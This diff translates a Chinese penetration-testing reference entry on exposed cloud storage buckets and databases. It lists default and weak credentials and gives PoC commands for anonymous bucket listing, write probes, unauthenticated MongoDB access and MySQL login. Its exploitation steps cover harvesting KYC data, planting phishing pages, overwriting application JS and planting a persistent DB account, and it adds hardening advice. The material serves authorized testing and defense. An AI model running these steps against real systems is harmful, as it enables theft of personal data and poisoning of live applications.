@@ -1,63 +1,63 @@
 ---
-title: 对象存储与数据存储裸露（OSS / S3 / MinIO / MySQL / MongoDB）
-cve: 无（配置缺陷）
+title: Exposed object storage and data stores (OSS / S3 / MinIO / MySQL / MongoDB)
+cve: None (configuration flaw)
 severity: high
 cvss: 8.6
-product: 阿里云 OSS / 腾讯云 COS / AWS S3 / MinIO / MySQL / MongoDB
-versions: 任意
+product: Alibaba Cloud OSS / Tencent Cloud COS / AWS S3 / MinIO / MySQL / MongoDB
+versions: Any
 ports: 80, 443, 9000, 3306, 27017
-keywords: oss, s3, bucket, minio, mongodb, mysql, 弱口令, 列举, kyc
+keywords: oss, s3, bucket, minio, mongodb, mysql, weak passwords, enumeration, kyc
 verified: false
-sources: 公开资料整理（业务逻辑 / 实现 / 配置缺陷类，无 CVE；出处见文末参考）
+sources: Compiled from public sources (business logic / implementation / configuration flaws; no CVE; see references below)
 ---
 
-## 指纹
+## Fingerprints
 
-- 资源 URL：`*.oss-cn-*.aliyuncs.com`、`*.cos.ap-*.myqcloud.com`、`*.s3.*.amazonaws.com`、`:9000`（MinIO 控制台）、`:27017`、`:3306`。
-- 前端 JS / `config.js` / 下载链接里的 `ossUrl`、`bucketName`、`Expires`、`OSSAccessKeyId`。
+- Resource URLs: `*.oss-cn-*.aliyuncs.com`, `*.cos.ap-*.myqcloud.com`, `*.s3.*.amazonaws.com`, `:9000` (MinIO console), `:27017`, `:3306`.
+- `ossUrl`, `bucketName`, `Expires`, and `OSSAccessKeyId` in frontend JS / `config.js` / download links.
 
-## 前置条件
+## Prerequisites
 
-- 对象存储：Bucket ACL 为 `public-read` / `public-read-write`（或桶策略允许匿名 List）。
-- 数据库：对外可达 + 弱口令（`root/root`、`root/123456`、`admin/admin`、Mongo 无认证）。
+- Object storage: bucket ACL is `public-read` / `public-read-write` (or the bucket policy allows anonymous List).
+- Database: externally reachable + weak passwords (`root/root`, `root/123456`, `admin/admin`, or Mongo without authentication).
 
 ## PoC
 
 ```bash
-# 1) OSS / COS / S3 匿名列举
+# 1) Anonymous OSS / COS / S3 enumeration
 curl -s 'https://bucket.oss-cn-hangzhou.aliyuncs.com/?prefix=&max-keys=100'
 curl -s 'https://bucket-1250000000.cos.ap-guangzhou.myqcloud.com/?prefix='
 aws s3 ls s3://bucket --no-sign-request
 
-# 2) 可写判定（只写一个无害探针，随后删除）
+# 2) Check write access (write only one harmless probe, then delete it)
 curl -X PUT 'https://bucket.oss-cn-hangzhou.aliyuncs.com/probe.txt' -d 'probe'
 
-# 3) MinIO 默认口令
+# 3) MinIO default credentials
 curl -s http://target:9000/minio/health/live
-# 控制台 admin / minioadmin，或 minioadmin/minioadmin
+# Console: admin / minioadmin, or minioadmin/minioadmin
 
-# 4) MongoDB 未授权
+# 4) Unauthenticated MongoDB access
 mongosh "mongodb://target:27017" --quiet --eval 'db.adminCommand({listDatabases:1})'
 
-# 5) MySQL 弱口令
+# 5) Weak MySQL passwords
 mysql -h target -uroot -p'root' -e 'select version(); show databases;'
 ```
 
-## 利用步骤
+## Exploitation Steps
 
-1. 从前端与日志里收集 bucket/DB 域名（图片、附件、对账单 PDF 的直链最好用）。
-2. 列举 → 按 key 前缀分类（`kyc/`、`withdraw/`、`avatar/`、`backup/`、`sql/`）；`backup/` 与 `sql/` 常直接是整库导出。
-3. 可写桶 → 传一个 HTML 用作"展示型 XSS/钓鱼页"，或覆盖业务 JS 做投毒（属高危动作，只在授权范围内做）。
-4. DB 进去后先看权限：MySQL `show grants`、Mongo `db.getUser()`；能写就落一个只读账号做长期观察，别改业务数据。
-5. 证据：1 个对象名 + ETag/大小 + 一条 `select` 结果；报告里说明数据类别与量级估算（不要贴证件图）。
+1. Collect bucket/DB domains from the frontend and logs (direct links to images, attachments, and statement PDFs work best).
+2. Enumerate → classify by key prefix (`kyc/`, `withdraw/`, `avatar/`, `backup/`, `sql/`); `backup/` and `sql/` often contain full database exports.
+3. Writable bucket → upload HTML as an "XSS demonstration/phishing page," or poison application JS by overwriting it (high-risk actions; perform only within the authorized scope).
+4. After accessing the DB, first inspect permissions: MySQL `show grants`, Mongo `db.getUser()`; if writes are possible, create a read-only account for long-term observation without changing application data.
+5. Evidence: one object name + ETag/size + one `select` result; describe data categories and estimated volume in the report (do not include identity-document images).
 
-## 修复与缓解（加固）
+## Remediation and Mitigation (Hardening)
 
-- Bucket 一律私有 + 预签名 URL（短有效期）；关闭匿名 List/Put；开启访问日志与异常告警。
-- MinIO 改默认口令并只对内；控制台与 API 分离端口。
-- MySQL/Mongo 只监听内网、强口令、最小权限账号；Mongo 开 `authorization: enabled`。
-- 定期扫描"公开桶/暴露 DB"，把上面 PoC 的前两条做成自检脚本。
+- Keep all buckets private + use short-lived presigned URLs; disable anonymous List/Put; enable access logs and anomaly alerts.
+- Change MinIO default passwords and restrict it to internal access; separate console and API ports.
+- Bind MySQL/Mongo only to internal interfaces, use strong passwords and least-privilege accounts; enable `authorization: enabled` in Mongo.
+- Regularly scan for "public buckets/exposed DBs" and turn the first two PoC items above into self-check scripts.
 
-## 参考
+## References
 
-- AWS S3 Block Public Access 文档；阿里云 OSS 权限与 ACL；MongoDB Security Checklist。
+- AWS S3 Block Public Access documentation; Alibaba Cloud OSS permissions and ACLs; MongoDB Security Checklist.
